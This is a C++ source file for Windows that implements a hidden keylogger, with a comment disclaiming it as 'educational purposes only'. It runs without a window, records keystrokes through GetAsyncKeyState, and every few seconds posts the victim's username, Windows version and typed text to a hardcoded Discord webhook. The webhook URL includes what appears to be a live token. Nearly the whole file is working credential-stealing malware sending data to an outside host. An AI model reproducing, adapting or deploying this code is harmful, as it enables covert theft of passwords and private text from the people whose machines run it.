#define _WIN32_WINNT 0x0500
#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <string>
#include <iostream>
#include <string>
#include <winhttp.h>
#include <Lmcons.h>

#pragma comment(lib, "winhttp.lib")

#pragma comment(lib, "ws2_32.lib")
using namespace std;
//compile g++ main.cpp -o main.exe -static -static-libgcc -static-libstdc++ -lwinhttp -lws2_32 -mwindows
//this code is educational purposes only and showcases how malware is coded and abused.
//the author is not responsible for any misuse of this code.


bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		return true;
	case VK_RETURN:
		return true;
	case 190: // ASCII code for '.' on US keyboard
	return true;
	case VK_SHIFT:
		return true;
	case VK_BACK:
		return true;
	case VK_RBUTTON:
		return true;
	case VK_CAPITAL:
		return true;
	case VK_TAB:
		return true;
	case VK_UP:
		return true;
	case VK_DOWN:
		return true;
	case VK_LEFT:
		return true;
	case VK_RIGHT:
		return true;
	case VK_CONTROL:
		return true;
	case VK_MENU:
		return true;
	default: 
		return false;
	}
}
bool sendToDiscord(const std::string& message) {

    // Replace with YOUR webhook path only (NOT full URL)
    const wchar_t* webhookPath =
        L"/api/webhooks/1375545256560558211/qgI6MppLjnBOAZsd8AAhSsOOstmvI8QD-xPOd0u12rYoSqomyDmjsb2Jyhc8yWZq_qQ7";

    // JSON body (ANSI is OK here)
    std::string json = "{\"content\":\"" + message + "\"}";

    // 1. Open WinHTTP session
    HINTERNET hSession = WinHttpOpen(
        L"MyApp/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    
    if (!hSession) return false;

    // 2. Connect to Discord server
    HINTERNET hConnect = WinHttpConnect(hSession, L"discord.com", 443, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    // 3. Open POST request to the webhook path
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"POST",
        webhookPath,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // 4. Send request with JSON body
    BOOL result = WinHttpSendRequest(
        hRequest,
        L"Content-Type: application/json\r\n",
        -1,
        (LPVOID)json.c_str(),
        json.size(),
        json.size(),
        0
    );

    if (result)
        result = WinHttpReceiveResponse(hRequest, NULL);

    // cleanup
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return result == TRUE;
}
string getLocalIP() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    char hostname[256];
    gethostname(hostname, sizeof(hostname));

    struct hostent* host = gethostbyname(hostname);
    if (host == nullptr) {
        return "Unable to get IP";
    }

    struct in_addr* addr = (struct in_addr*)host->h_addr_list[0];
    string ip = inet_ntoa(*addr);

    WSACleanup();
    return ip;
}
std::string getUsername(){
    char username[UNLEN + 1];
    DWORD size = UNLEN + 1;

    if (GetUserNameA(username, &size)) {
        return std::string(username);
    } else {
        return "";
    }
}
std::string getWindowsVersion() {
    // Declare function pointer type
    typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);

    // Load ntdll.dll
    HMODULE hMod = GetModuleHandleA("ntdll.dll");
    if (!hMod) return "Unknown";

    // Get pointer to RtlGetVersion
    RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
    if (!fxPtr) return "Unknown";

    // Fill RTL_OSVERSIONINFOW structure
    RTL_OSVERSIONINFOW osInfo = { 0 };
    osInfo.dwOSVersionInfoSize = sizeof(osInfo);
    if (fxPtr(&osInfo) != 0) return "Unknown";

    // Determine OS
    if (osInfo.dwMajorVersion == 10 && osInfo.dwBuildNumber >= 22000) {
        return "Windows 11";
    } else if (osInfo.dwMajorVersion == 10) {
        return "Windows 10";
    } else if (osInfo.dwMajorVersion == 6 && osInfo.dwMinorVersion == 3) {
        return "Windows 8.1";
    } else if (osInfo.dwMajorVersion == 6 && osInfo.dwMinorVersion == 2) {
        return "Windows 8";
    } else if (osInfo.dwMajorVersion == 6 && osInfo.dwMinorVersion == 1) {
        return "Windows 7";
    } else {
        return "Older Windows";
    }
}
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmd, int show) {
    sendToDiscord("**username: "+ getUsername() + "**");
    sendToDiscord("**windows: " + getWindowsVersion() + "**");

    string buffer;

    auto lastSent = GetTickCount();
    while (true) {
        for (int KEY = 8; KEY <= 190; KEY++) {
            if (GetAsyncKeyState(KEY) & 1) {
                if (!SpecialKeys(KEY)) {
                    BYTE keyboardState[256];
                    GetKeyboardState(keyboardState);

                    // Update SHIFT state manually
                    if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
                        keyboardState[VK_SHIFT] = 0x80;

                    // Update CAPSLOCK state manually
                    if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
                        keyboardState[VK_CAPITAL] = 0x01;

                    UINT scanCode = MapVirtualKey(KEY, MAPVK_VK_TO_VSC);

                    WCHAR unicodeChar[5];
                    int result = ToUnicode(KEY, scanCode, keyboardState, unicodeChar, 4, 0);

                    if (result == 1) {
                        buffer += (char)unicodeChar[0];
                    }
                }
            }
        }

        if (GetTickCount() - lastSent > 5000 && !buffer.empty()) { // every 5s
            sendToDiscord(buffer);
            buffer.clear();
            lastSent = GetTickCount();
        }

        Sleep(1);
    }

    return 0;
}

